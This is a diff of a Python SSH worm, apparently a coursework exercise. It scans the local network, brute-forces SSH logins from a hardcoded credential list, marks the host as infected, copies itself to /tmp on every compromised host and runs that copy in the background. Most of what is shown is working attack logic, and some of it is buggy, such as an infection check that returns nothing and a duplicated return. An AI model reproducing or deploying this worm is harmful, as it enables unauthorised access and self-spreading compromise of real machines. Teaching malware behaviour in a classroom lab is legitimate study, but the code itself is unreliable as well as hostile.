@@ -1,14 +1,13 @@
+# Ricardo Lucero
+# Reynaldo K Galvan
 import paramiko
 import sys
 import socket
 import nmap
-#import netinfo
 import os
 import sys
 import os.path
 import socket, fcntl, struct
-
-#from getip import getifip
 
 # The list of credentials to attempt
 credList = [
@@ -33,6 +32,7 @@ def isInfectedSystem():
 	# as infected).
 	
 	# checks if infected.txt already exists
+
 	os.path.isfile(INFECTED_MARKER_FILE)
 		
 	
@@ -134,17 +134,6 @@ def tryCredentials(host, username, password, sshClient):
 		return 1
 
 	return 0
-	
-
-###############################################################
-# Wages a dictionary attack against the host
-# @param host - the host to attack
-# @return - the instace of the SSH paramiko class and the
-# credentials that work in a tuple (ssh, username, password).
-# If the attack failed, returns a NULL
-###############################################################
-
-
 ####################################################
 # Returns the IP of the current system
 # @param interface - the interface whose IP we would
@@ -195,7 +184,13 @@ def getHostsOnTheSameNetwork():
 	
 	return runningHosts
 
-
+###############################################################
+# Wages a dictionary attack against the host
+# @param host - the host to attack
+# @return - the instace of the SSH paramiko class and the
+# credentials that work in a tuple (ssh, username, password).
+# If the attack failed, returns a NULL
+###############################################################
 def attackSystem(host):
 	
 	# The credential list
@@ -221,7 +216,7 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		#print("Trying Username & password combination: " +username +" "+ password)
+		print("Trying Username & password combination: " +username +" "+ password)
 		if tryCredentials(host, username, password, ssh) == 0: 
 			print ("We have successfully compromised the victim: " + host +" with: "+ username + " " + password)
 			attemptResults = (ssh.connect(host,username=username, password=password), username, password)
@@ -230,37 +225,39 @@ def attackSystem(host):
 
 			# If the system was already infected proceed.
 			# Otherwise, infect the system and terminate.
-			# Infect that system
-			if isInfectedSystem():
-				return
+			# Infect that system	
+			if isInfectedSystem() == True:
+				return 
 			# Did the attack succeed?
 			if attemptResults:
-				# create infected file 
+				# create infected file
 				markInfected()	
 				print ("This system " + host + " should be infected")
-				# Copy yourself to the remote system. 
-				sftp.put("worm1.py", "/tmp/worm1.py")
-
+				# Copy yourself to the remote system.
+				sftp.put("ReplicatorWorm.py", "/tmp/ReplicatorWorm.py")
 				#	# Copy the file from the specified
-				#	# remote path to the specified
+				# 	# remote path to the specified
 				# 	# local path. If the file does exist
-				#	# at the remote path, then get()
+				# 	# at the remote path, then get()
 				# 	# will throw IOError exception
 				# 	# (that is, we know the system is
 				# 	# not yet infected).
-				
 
-			ssh.exec_command("chmod a+x /tmp/worm1.py")
+			ssh.exec_command("chmod a+x /tmp/ReplicatorWorm.py")
+
 			# /tmp/infected.txt - the malicious file
-
-			# run the whole commnand in the background	
-			ssh.exec_command("nohup python /tmp/worm1.py &")
+			# run the whole commnand in the background
+			ssh.exec_command("nohup python /tmp/ReplicatorWorm.py &")
+			return attemptResults
 
 			return attemptResults
 		else: 
 			# Could not find working credentials
-			paramiko.SSHException()	
-			print(username +" "+ password + " Didn't work on: " + host)
+			paramiko.SSHException()
+			print("These Credentials didn't work: " + username +" "+ password + " on: " + host)	
+	
+	
+
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -293,13 +290,11 @@ print ("Found hosts: ", networkHosts ,'\n')
 
 
 # Go through the network hosts
-for host in networkHosts:
-	
-	#print("Connecting to: " + host)	
+for host in networkHosts:	
 
 	# Try to attack this host
 	print("Trying to Connect to: " + host)
 	sshInfo =  attackSystem(host)	
-	
+
 	#if sshInfo:
 	#	break	
